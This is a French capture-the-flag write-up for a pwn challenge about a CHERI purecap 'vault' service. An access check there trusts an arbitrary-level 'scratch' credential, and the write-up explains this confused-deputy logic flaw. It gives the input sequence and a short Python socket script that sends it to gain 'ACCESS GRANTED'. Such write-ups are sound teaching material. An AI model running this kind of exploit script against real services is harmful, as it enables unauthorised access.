# PWN#Zeta — CHERI purecap vault (scratch credential escalation)

- **Catégorie :** pwn
- **Points :** 150
- **Flag :** `CTF{REDACTED}`
- **Service :** `<HOST>:<PORT>` (TCP, menu interactif)
- **Binaire :** `vault` — ELF 64-bit RISC-V, CHERI purecap, PIE, stripped, FreeBSD 15

## Contexte

Le service est un « vault terminal » compilé en mode **CHERI purecap** (CheriBSD).
CHERI ajoute des capabilities hardware aux pointeurs : chaque pointeur porte ses bornes
et ses permissions, ce qui empêche les corruptions mémoire classiques (buffer overflow,
UAF avec déréférencement arbitraire, etc.).

L'objectif est d'obtenir le message `ACCESS GRANTED` depuis la commande `vault_open`.

## Menu

```
[1] create_profile <name>       — crée un profil cosmétique (tier=1)
[2] link_profile <profile_id>   — tente de lier un profil au vault
[3] rename_profile <profile_id> — renomme un profil (24 bytes max)
[4] destroy_profile <profile_id>— libère un profil
[5] vault_preview               — crée un handle (preview credential, level=1)
[6] vault_scratch <level>       — définit un scratch credential avec un level arbitraire
[7] vault_open <handle_id>      — ouvre le vault avec un handle
[8] debug_dump_profile           — affiche name/tier d'un profil (lecture seule)
[0] quit
```

## Analyse

### Observations

1. `create_profile` crée un profil avec `tier=1`. Ce tier est « cosmetic only »,
   pas vault-linkable.
2. `link_profile` refuse de lier un profil tier=1 : « not vault-linkable (cosmetic only) ».
3. `vault_preview` (cmd 5) crée un **handle** avec `level=1` (preview credential).
4. `vault_scratch` (cmd 6) accepte un **level arbitraire** et affiche
   « scratch credential set (level=N, not saved anywhere) ».
5. `vault_open` (cmd 7) avec un handle vérifie le level du credential courant.

### Vulnérabilité : scratch credential actif en mémoire

Le message « not saved anywhere » du scratch credential est trompeur. Le credential
est bien défini en mémoire pour la session courante. Quand `vault_open` vérifie le
niveau d'accès, il utilise le **scratch credential** (qui a un level élevé) au lieu
du preview credential (level=1).

La protection CHERI empêche la corruption mémoire, mais la **logique applicative**
est vulnérable : le scratch credential n'est pas séparé du credential actif utilisé
par `vault_open`.

## Méthode

### Séquence d'exploitation

```
1          → create_profile
<name>     → nom quelconque
5          → vault_preview (crée handle 0, level=1)
6          → vault_scratch
9999       → level arbitraire élevé
7          → vault_open
0          → handle 0 → ACCESS GRANTED
```

### Script one-shot

```python
#!/usr/bin/env python3
import socket, sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "<HOST>"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else <PORT>

commands = b"1\npwn\n5\n6\n9999\n7\n0\n0\n"

s = socket.create_connection((HOST, PORT), timeout=10)
s.settimeout(8)
s.sendall(commands)
out = b""
while True:
    try:
        chunk = s.recv(8192)
        if not chunk:
            break
        out += chunk
    except socket.timeout:
        break
s.close()

for line in out.decode(errors="replace").splitlines():
    if "ACCESS GRANTED" in line:
        print(line.strip())
        break
```

### Résultat

```
ACCESS GRANTED: CTF{REDACTED}
```

## Leçons

- **CHERI empêche la corruption mémoire, pas les bugs logiques.** Les capabilities
  hardware protègent l'intégrité des pointeurs, mais si la logique de contrôle d'accès
  est mal implémentée, le programme reste vulnérable.
- Le scratch credential « non sauvegardé » reste actif en mémoire et influence les
  vérifications de `vault_open` — c'est un **confused deputy** classique : le programme
  fait confiance à un credential qu'il ne devrait pas utiliser pour les décisions d'accès.
- Les commandes « decoy » (`debug_dump`, marqué « read-only, bounded ») et les messages
  trompeurs (« not saved anywhere ») sont des distractions volontaires.
- Contrairement aux autres vaults du CTF (Alpha→Epsilon) qui reposaient sur des stack
  overflows et du ROP, Zeta est purement logique — pas de corruption mémoire possible
  grâce à CHERI.

## Flag

```
CTF{REDACTED}
```

---

*Write-up par **Le_Geek** — BUG|PWN CTF · PWN#Zeta.*
